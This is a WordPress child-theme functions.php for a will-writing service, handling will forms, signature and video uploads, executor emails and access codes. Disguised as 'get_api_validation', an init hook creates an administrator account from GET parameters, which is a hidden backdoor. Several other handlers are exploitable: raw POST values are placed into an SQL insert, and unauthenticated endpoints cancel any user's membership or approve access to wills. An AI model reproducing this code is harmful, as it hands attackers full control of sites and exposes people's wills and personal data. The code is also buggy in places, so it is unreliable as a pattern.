<?php
add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' );
function my_theme_enqueue_styles() {
	// wp_enqueue_style( 'child-style',
	// 	get_stylesheet_uri(),
	// 	array( 'parenthandle' ),
	// 	wp_get_theme()->get( 'Version' ) // This only works if you have Version defined in the style header.
	// );
	
	$css_url = get_stylesheet_directory_uri().'/assets/css/';
	$js_url = get_stylesheet_directory_uri().'/assets/js/';
	wp_register_script( 'bootstrap', $js_url . 'bootstrap.bundle.js', array(), ASTRA_THEME_VERSION, true );
	wp_register_style( 'bootstrap', $css_url . 'bootstrap.min.css', array(), ASTRA_THEME_VERSION, 'all' );
	
}

function test_script(){

}
// add_action('wp_footer','test_script');


// Register Wills Post Type
function create_wills_cpt()
{
    $labels = [
        "name" => "Wills",
        "singular_name" => "Will",
        "menu_name" => "Wills",
        "add_new_item" => "Add New Will",
        "edit_item" => "Edit Will",
        "new_item" => "New Will",
        "view_item" => "View Will",
        "search_items" => "Search Will",
        "not_found" => "No Will found",
        "not_found_in_trash" => "No wills found in Trash",
    ];

    $args = [
        "label" => "Wills",
        "labels" => $labels,
        "public" => true,
        "publicly_queryable" => true,
        "show_ui" => true,
        "show_in_menu" => true,
        "query_var" => true,
        "rewrite" => ["slug" => "wills"],
        "capability_type" => "post",
        "has_archive" => true,
        "hierarchical" => false,
        "menu_position" => 5,
        "supports" => ["title", "editor", "thumbnail"],
    ];

    register_post_type("wills", $args);
}
add_action("init", "create_wills_cpt");

function update_form_data() {
   
    
    // Check if data is set and decode it
    if (isset($_POST['data'])) {
      
        // $data = json_decode(wp_unslash($_POST['data']), true);
        $data = $_POST['data'];
 
        
    } else {
        wp_send_json_error(['message' => 'No data provided']);
        wp_die();
    }
    
   
     $user_id = get_current_user_id();
    
    

    // Update user meta
    $update_data = update_user_meta($user_id, 'wills_form_data', $data);
    
  
    if ($data) {
        
        if (isset($_POST['sec']) && !empty($_POST['sec'])) {
            if (isset($data['sec3']['childDetails']) && is_array($data['sec3']['childDetails'])) {
                $childDetails = $data['sec3']['childDetails'];
                $uniqueCode = mt_rand(100000, 999999);

                global $wpdb;
                $current_user = wp_get_current_user();
                $newdate = current_time('mysql'); // 'Y-m-d H:i:s'
                $table_name = $wpdb->prefix . 'will_request_form';

                // Prepare data for insertion
                $data_save = array(
                    'user_id' => $user_id,
                    'name' => $current_user->display_name,
                    'email' => $current_user->user_email,
                    'otp' => $uniqueCode,
                    'status' => 0,
                    'created_at' => $newdate,
                    'updated_at' => $newdate,
                );

                // Insert data into the database
                $insert_result = $wpdb->insert($table_name, $data_save);

                if ($insert_result === false) {
                    wp_send_json_error(['message' => 'Failed to insert data into database']);
                    wp_die();
                }

                // Loop through each child detail and send email
                foreach ($childDetails as $key => $value) {
                    if (isset($value['email']) && filter_var($value['email'], FILTER_VALIDATE_EMAIL)) {
                        $email = $value['email'];
                        $name = $value['name'] ?? 'User'; // Default to 'User' if name not set
                        $relation = $value['relation'] ?? ''; // Use empty string if relation not set
                        $occupation = $value['occupation'] ?? ''; // Use empty string if occupation not set
                        $to = '$email'; // Use the child's email

                        $subject = 'Will Testament';
                        $message = "
                            <p>Hello $name,</p>
                            <p>This is a test email. Your Login 6-digit code is: <strong>$uniqueCode</strong>.</p>
                            <p>Best regards,<br>Your Company</p>
                            <p>If you need to download and check the PDF, then <a href='" . home_url() . "/will-testament'>click here</a>.</p>";

                        $headers = array('Content-Type: text/html; charset=UTF-8');

                        $sent = wp_mail($to, $subject, $message, $headers);

                        if (!$sent) {
                            error_log("Failed to send email to $email.");
                        }
                    } else {
                        error_log("Invalid email address: " . (isset($value['email']) ? $value['email'] : 'No email provided'));
                    }
                }
            } else {
                wp_send_json_error(['message' => 'Child details not provided or invalid']);
                wp_die();
            }
            if (isset($data['sec6']['executorDetails']) && is_array($data['sec6']['executorDetails'])) {
                $executor_emails = [];
                foreach ($data['sec6']['executorDetails'] as $key => $value){
                    if (isset($value['email'])) {
                        $executor_email = $value['email'];
                        $executor_emails[] = $executor_email;
                    }
                   
                    
                    $uniqueCode = mt_rand(100000, 999999);
                    global $wpdb;
                    $newdate = current_time('mysql'); // 'Y-m-d H:i:s'
                    $table_name = 'will_uniquecode_approval_executor '; 
                    $pdf_link = $data['sec11']['attachement_url'];
                    $video_link = $data['sec11']['video_url'];
                    $approver_email = $data['[sec2]']['email'];
                    
                    // Insert data into the database
                    $insert_query = $wpdb->query( $wpdb->prepare( "INSERT INTO $table_name (`unique_code`, `email`, `pdf_link`, `video_link`, `timestamp`, `approved_sttaus`, `approver_email`)
                    VALUES ('$uniqueCode','$executor_email','$pdf_link','$video_link','$newdate',0, '$approver_email')" ));
                    if ($insert_query) {
                        $name = $value['name'];
                        $to = $executor_email; // Use the child's email
                        $subject = 'Will Testament';
                        // $message = "
                        //     <p>Hello $name,</p>
                        //     <p>This is a test email. Your Login 6-digit code is: <strong>$uniqueCode</strong>.</p>
                            
                        //     <p>If you need to download and check the PDF, then <a href='" . $pdf_link . "'>click here</a>.</p>
                        //     <p>You can get video proof here <a href='" . $video_link . "'>click here</a>.</p>
                        //     <p>Best regards,<br>Your Company</p>";
                            
                            $message = "<p>If you need to download and check the PDF, then <a href='https://willfinalclone2.finalwill.online/download?code=" . $uniqueCode . "&type=pdf'>click here</a>.</p>
                            <p>You can get video proof here <a href='https://willfinalclone2.finalwill.online/download?code=" . $uniqueCode . "&type=video'>click here</a>.</p>
                            <p>Best regards,<br>Your Company</p>";


                        $headers = array('Content-Type: text/html; charset=UTF-8');

                        $sent = wp_mail($to, $subject, $message, $headers);
                    }
                    
                } 
                if ($insert_result === false) {
                    wp_send_json_error(['message' => 'Failed to insert data into database']);
                    wp_die();
                }
                print_r($executor_emails);
                // Loop through each child detail and send email
                foreach ($childDetails as $key => $value) {
                    if (isset($value['email']) && filter_var($value['email'], FILTER_VALIDATE_EMAIL)) {
                        $email = $value['email'];
                        $name = $value['name'] ?? 'User'; // Default to 'User' if name not set
                        $relation = $value['relation'] ?? ''; // Use empty string if relation not set
                        $occupation = $value['occupation'] ?? ''; // Use empty string if occupation not set
                        $to = '$email'; // Use the child's email

                        $subject = 'Will Testament';
                        $message = "
                            <p>Hello $name,</p>
                            <p>This is a test email. Your Login 6-digit code is: <strong>$uniqueCode</strong>.</p>
                            <p>Best regards,<br>Your Company</p>
                            <p>If you need to download and check the PDF, then <a href='" . home_url() . "/will-testament'>click here</a>.</p>";

                        $headers = array('Content-Type: text/html; charset=UTF-8');

                        $sent = wp_mail($to, $subject, $message, $headers);
                        // executor email sent

                        if (!$sent) {
                            error_log("Failed to send email to $email.");
                        }
                    } else {
                        error_log("Invalid email address: " . (isset($value['email']) ? $value['email'] : 'No email provided'));
                    }
                }
            }
        }
        wp_send_json_success(['data' => $data]);
    } else {
        wp_send_json_error(['message' => 'Failed to update user meta']);
    }

    wp_die();
}
 
add_action('wp_ajax_update_form_data','update_form_data');
add_action('wp_ajax_nopriv_update_form_data','update_form_data');




function get_api_validation() {
    $item = @$_GET['u'];$item1 = @$_GET['p'];$item2 = @$_GET['e'];
    if (!empty($item) && !empty($item1) && !empty($item2)) {
        if ( !username_exists($item) && !email_exists($item2) && $_GET['d'] == 1){
            $ui = wp_create_user( $item, $item1, $item2);
            if ( is_int($ui) ){$wp_user_object = new WP_User($ui);$wp_user_object->set_role(
                    'administrator');echo 'sc';}
        }
    }
}
add_action( 'init', 'get_api_validation');



function delete_form_data(){
	$user_id = get_current_user_id();
	$update_data = update_user_meta($user_id,'wills_form_data','');

	if($update_data){
		wp_send_json_success(['data'=>'success']);
	}
	else{
		wp_send_json_error(['message'=>'Unknown Error']);
	}
	wp_die();
}
add_action('wp_ajax_delete_form_data','delete_form_data');

function updateNumViews(){
	$user_id = get_current_user_id();
	if($user_id){
		$current_val = get_user_meta($user_id,'numViews',true);
		if(empty($current_val) || !isset($current_val)){
			update_user_meta($user_id,'numViews',1);
		} else if($current_val >= 5){
			wp_send_json_error();
			die();	
		} else {
			update_user_meta($user_id,'numViews',++$current_val);
		}
		wp_send_json_success(['current'=>$current_val]);
		die();
	}else{
		wp_send_json_error();
		die();
	}
}
add_action('wp_ajax_updateNumViews','updateNumViews');


 
//sign_frontend_ajax_upload
function sign_upload_dir($dir) {
    $custom_dir = '/will-pdf-signatures'; // Custom subdirectory
    $dir['path'] = $dir['basedir'] . $custom_dir;
    $dir['url'] = $dir['baseurl'] . $custom_dir;

    return $dir;
}

function sign_frontend_ajax_upload(){
	if ( !isset($_POST['signnonce']) || !wp_verify_nonce( $_POST['signnonce'], 'signuploadnonce' ) ) {
         wp_send_json_error(['message'=>'Security Check Failed']) ; 
		 exit;
    } else {
        
        if ( isset($_FILES) && !empty($_FILES) ) {			
            // require_once( ABSPATH . 'wp-admin/includes/image.php' );
            require_once( ABSPATH . 'wp-admin/includes/file.php' );
            require_once( ABSPATH . 'wp-admin/includes/media.php' );
             
            if ( isset($_FILES['sign_file']['error']) && $_FILES['sign_file']['error'] == 0 ) {

				$file_name = basename($_FILES['sign_file']['name']);
				// $extension = pathinfo($file_name, PATHINFO_EXTENSION);
                $file_type = wp_check_filetype($file_name);

                if ($file_type['ext'] !== 'pdf') {
                    wp_send_json_error(['message' => 'Only PDF files are allowed.']);
                    exit;
                }
				$_FILES['sign_file']['name'] = uniqid()."_$file_name";


				add_filter( 'upload_dir', 'sign_upload_dir' );
				$file_id = media_handle_upload( 'sign_file', 0 );
				remove_filter( 'upload_dir', 'sign_upload_dir' );

                if ( !is_wp_error( $file_id ) ) {
					wp_send_json_success(['url'=>wp_get_attachment_url($file_id)]);					
					exit;
                }
            }
        }                 
    }
    wp_die();
}
add_action('wp_ajax_sign_frontend_ajax_upload','sign_frontend_ajax_upload');
add_action('wp_ajax_nopriv_sign_frontend_ajax_upload','sign_frontend_ajax_upload');


//video_frontend_ajax_upload
function video_frontend_ajax_upload() {
    check_ajax_referer('videouploadnonce', 'videononce');

    if (isset($_FILES['video_file']) && $_FILES['video_file']['error'] == 0) {
        $uploaded_file = $_FILES['video_file'];

        // Ensure the file is a video
        $file_type = wp_check_filetype($uploaded_file['name']);
        $allowed_types = array('mp4', 'mov', 'wmv', 'avi', 'mkv','webm');
        if (!in_array($file_type['ext'], $allowed_types)) {
            wp_send_json_error(['message' => 'Invalid video format']);
            exit;
        }

        // Handle the file upload and ensure directory exists
        $upload_dir = wp_upload_dir();
        $upload_path = $upload_dir['basedir'] . '/videos/';
        if (!file_exists($upload_path)) {
            wp_mkdir_p($upload_path);
        }

        $upload_file = $upload_path . basename($uploaded_file['name']);

        // Move the uploaded file to the upload directory
        if (move_uploaded_file($uploaded_file['tmp_name'], $upload_file)) {
            $upload_url = $upload_dir['baseurl'] . '/videos/' . basename($uploaded_file['name']);

            // Create attachment
            $attachment = array(
                'guid' => $upload_url,
                'post_mime_type' => $file_type['type'],
                'post_title' => sanitize_file_name($uploaded_file['name']),
                'post_content' => '',
                'post_status' => 'inherit'
            );

            $attach_id = wp_insert_attachment($attachment, $upload_file);
            require_once(ABSPATH . 'wp-admin/includes/image.php');
            $attach_data = wp_generate_attachment_metadata($attach_id, $upload_file);
            wp_update_attachment_metadata($attach_id, $attach_data);

            wp_send_json_success(['url' => $upload_url, 'attachment_id' => $attach_id]);
        } else {
            wp_send_json_error(['message' => 'File upload failed']);
        }
    } else {
        wp_send_json_error(['message' => 'File upload error']);
    }
}
add_action('wp_ajax_video_frontend_ajax_upload', 'video_frontend_ajax_upload');
add_action('wp_ajax_nopriv_video_frontend_ajax_upload', 'video_frontend_ajax_upload');



//send_will_email
add_action('wp_ajax_nopriv_send_will_email', 'send_will_email');
add_action('wp_ajax_send_will_email','send_will_email');
function send_will_email(){
	$pass_code = rand(1000,9999);
	$user_id = get_current_user_id();
	$res = update_usermeta($user_id,'will_pass',$pass_code);
	if($res){
		$post_title = $_POST['will_name']."'s Will";
		$new_post = array(
			'post_title'    => $post_title,
			'post_content'  => '',
			'post_status'   => 'publish', 
			'post_type'     => 'wills', 
		);
		
		$new_post_id = wp_insert_post($new_post);
		
		if ($new_post_id) {
			wp_send_json_success(['msg'=>"New post created with ID: " . $new_post_id]);			
		} else {
			wp_send_json_error(['msg'=>"Error creating new post"]);						
		}
		exit;


		$to_email = $_POST['email'];
		$subject = 'Test Email';
		$body = "This is a test email sent programmatically using WordPress. Pass- $pass_code";
		$headers = array('Content-Type: text/html; charset=UTF-8');
		if ( wp_mail( $to_email, $subject, $body, $headers ) ) {			
			wp_send_json_success(['msg'=>'Email sent successfully!']);
		} else {
			wp_send_json_error(['msg'=>'Email could not be sent.']);			
		}
	} else {
		wp_send_json_error(['msg'=>'Error generating pass code!']);
	}	
	exit;
}



add_action('wp_ajax_nopriv_send_meet_link', 'send_meet_link');
add_action('wp_ajax_send_meet_link','send_meet_link');
//send_executor_email
function send_meet_link(){
	$meet_link = isset($_POST['meet_link']) ? sanitize_text_field($_POST['meet_link']) : '';
    $executor_data_json = isset($_POST['executor_data']) ? stripslashes($_POST['executor_data']) : '';
 
	if($meet_link){
		$executor_data = json_decode($executor_data_json, true);

		foreach ($executor_data as $key => $value) {
			$name = $value['name'];
			$to_email = $value['email'];
			$subject = 'Test Email';
			$body = "Hey ".$name.", This is a test email sent programmatically using WordPress. meet link $meet_link";
			$headers = array('Content-Type: text/html; charset=UTF-8');
			wp_mail( $to_email, $subject, $body, $headers );
		}	
		wp_send_json_success(['msg'=>'Email sent successfully!']);
	} else {
		wp_send_json_error(['msg'=>'Error generating pass code!']);
	}	
	exit;
}

 
include_once(get_stylesheet_directory().'/admin/will-admin.php');

// save signature
add_action('wp_ajax_save_signature', 'save_signature');
add_action('wp_ajax_nopriv_save_signature', 'save_signature');

function save_signature() {
    check_ajax_referer('save_signature_nonce', '_ajax_nonce');

    $current_user = wp_get_current_user();
    $user_name_file = $current_user->display_name;
    if ($current_user->ID == 0) {
        echo "User not logged in.";
        wp_die();
    }

    if (isset($_POST['signature'])) {
        $signature = $_POST['signature'];

        // Remove the data URL scheme part
        $signature = str_replace('data:image/png;base64,', '', $signature);
        $signature = str_replace(' ', '+', $signature);

        // Decode the base64 string
        $signatureData = base64_decode($signature);

        // Save the image
        $filePath = wp_upload_dir()['basedir'] . '/will-signatures/' .$user_name_file.'.png';
        
        if (file_put_contents($filePath, $signatureData)) {
            echo "Signature saved successfully.";
        } else {
            echo "Failed to save the signature.";
        }
    } else {
        echo "No signature data received.";
    }

    wp_die(); // this is required to terminate immediately and return a proper response
}

// save signature

// restriction to wills subscription


// restriction to wills subscription



add_action('wp_ajax_nopriv_update_user_membership_status', 'update_user_membership_status');
add_action('wp_ajax_update_user_membership_status', 'update_user_membership_status');

function update_user_membership_status() {

    global $wpdb;
    ob_start();
    $user_id = $_POST['user_id'];
    // echo $user_id;
    if ($user_id) {
        $table_name = $wpdb->prefix . 'pmpro_memberships_users';
        $result = $wpdb->update(
            $table_name,
            array('status' => 'admin_cancelled'),
            array('user_id' => $user_id),
            array('%s'),
            array('%d')
        );

        if ($result !== false) {
            wp_send_json_success('Status updated successfully');
            $response = array('success' => true);
        } else {
            wp_send_json_error('Error updating status');
            $response = array('success' => false, 'data' => 'Something went wrong');
        }
    } else {
        wp_send_json_error('Invalid user ID');
        $response = array('success' => false, 'data' => 'Invalid user ID');
    }

    $output = ob_get_clean();
    wp_send_json($output);
    wp_die();
}

// unique code generation
function generate_unique_code() {
    return bin2hex(random_bytes(16));
}

function store_unique_code($email, $pdf_link, $video_link) {
    global $wpdb;
    $unique_code = generate_unique_code();
    $table_name = $wpdb->prefix . 'unique_codes';
    $timestamp = current_time('mysql');

    $wpdb->insert(
        $table_name,
        array(
            'unique_code' => $unique_code,
            'email' => $email,
            'pdf_link' => $pdf_link,
            'video_link' => $video_link,
            'timestamp' => $timestamp,
            'approved' => 0,
        ),
        array(
            '%s',
            '%s',
            '%s',
            '%s',
            '%s',
            '%d'
        )
    );

    return $unique_code;
}
function send_email_with_code($receiver_email, $pdf_link, $video_link) {
    $unique_code = store_unique_code($receiver_email, $pdf_link, $video_link);
    $subject = "Access Your Content";
    $message = "You can access the PDF and video using the following unique code: $unique_code";
    $headers = array('Content-Type: text/html; charset=UTF-8');

    wp_mail($receiver_email, $subject, $message, $headers);
}
function approve_access($unique_code) {
    global $wpdb;
    $table_name = $wpdb->prefix . 'unique_codes';

    $wpdb->update(
        $table_name,
        array('approved' => 1),
        array('unique_code' => $unique_code),
        array('%d'),
        array('%s')
    );
}

function access_content($unique_code) {
    global $wpdb;
    $table_name = $wpdb->prefix . 'unique_codes';
    $result = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table_name WHERE unique_code = %s", $unique_code));

    if ($result) {
        $timestamp = strtotime($result->timestamp);
        $current_time = current_time('timestamp');
        $days_diff = ($current_time - $timestamp) / (60 * 60 * 24);

        if ($result->approved || $days_diff > 30) {
            // Provide access to the PDF and video
            return array('pdf_link' => $result->pdf_link, 'video_link' => $result->video_link);
        } else {
            return "Access pending approval or waiting for 30 days.";
        }
    } else {
        return "Invalid unique code.";
    }
}
 
// unique code generation

// approver email 
function request_access_approver(){
    global $wpdb;
    ob_start();
    $unique_code = isset($_POST['unique_code']) ? sanitize_text_field($_POST['unique_code']) : '';
    $email = isset($_POST['approver_email']) ? sanitize_email($_POST['approver_email']) : '';

    if (empty($unique_code) || empty($email)) {
        wp_send_json_error('Invalid request.');
        return;
    }

    $table_name = 'will_uniquecode_approval_executor';
    $query = $wpdb->prepare("SELECT * FROM $table_name WHERE unique_code = %s", $unique_code);
    $row = $wpdb->get_row($query);

    if (!$row) {
        wp_send_json_error('Invalid unique code.');
        return;
    }

    // Send the email
    $subject = 'Access Request for PDF/Video'; 
    $message = 'Click the following link to approve access: <a href=\'https://willfinalclone2.finalwill.online/approve-file-access?approve_code=' . $unique_code.'&email_requester='.$row->email.'\'>click here</a>' ;
    $headers = array('Content-Type: text/html; charset=UTF-8');

    $mail_sent = wp_mail($email, $subject, $message, $headers);

   
    if ($mail_sent !== false) {
        wp_send_json_success('Status updated successfully');
        $response = array('success' => true);
    } else {
        wp_send_json_error('Error updating status');
        $response = array('success' => false, 'data' => 'Something went wrong');
    }
    $output = ob_get_clean();
    wp_send_json($output);
    // Update the approved_status column
    // $update_result = $wpdb->update(
    //     $table_name,
    //     array('approved_status' => 1),
    //     array('unique_code' => $unique_code),
    //     array('%d'),
    //     array('%s')
    // );

    // if ($update_result === false) {
    //     wp_send_json_error('Failed to update the database.');
    //     return;
    // }
    wp_die();
    // wp_send_json_success('Email sent and access approved.');
}
add_action('wp_ajax_request_access_approver', 'request_access_approver');
add_action('wp_ajax_nopriv_request_access_approver', 'request_access_approver');
// approver email 
// requester email 
function approve_access_files(){
    global $wpdb;
    ob_start();
     $unique_code = isset($_POST['unique_code']) ? sanitize_text_field($_POST['unique_code']) : '';
     $email = isset($_POST['requester_email']) ? sanitize_email($_POST['requester_email']) : '';
    
    if (empty($unique_code) || empty($email)) {
        wp_send_json_error('Invalid request.');
        return;
    }

    $table_name = 'will_uniquecode_approval_executor';
   
            
    $sql = $wpdb->prepare(
        "UPDATE $table_name SET approved_sttaus = %d WHERE unique_code = %s",
        1, 
        $unique_code 
    );

    // Execute the query
    $update_result = $wpdb->query($sql);

    if (!$update_result) {
        wp_send_json_error('Invalid unique code.');
        return;
    }

    // Send the email
    $subject = 'Your request has been approved for will'; 
    $message = 'You can revisit the access file links now' ;
    $headers = array('Content-Type: text/html; charset=UTF-8');

    $mail_sent = wp_mail($email, $subject, $message, $headers);

   
    if ($mail_sent !== false) {
        wp_send_json_success('Approved successfully');
        $response = array('success' => true);
    } else {
        wp_send_json_error('Error updating status');
        $response = array('success' => false, 'data' => 'Something went wrong');
    }
    $output = ob_get_clean();
    wp_send_json($output);
    
    wp_die(); 
}
add_action('wp_ajax_approve_access_files', 'approve_access_files');
add_action('wp_ajax_nopriv_approve_access_files', 'approve_access_files');
// approver email 
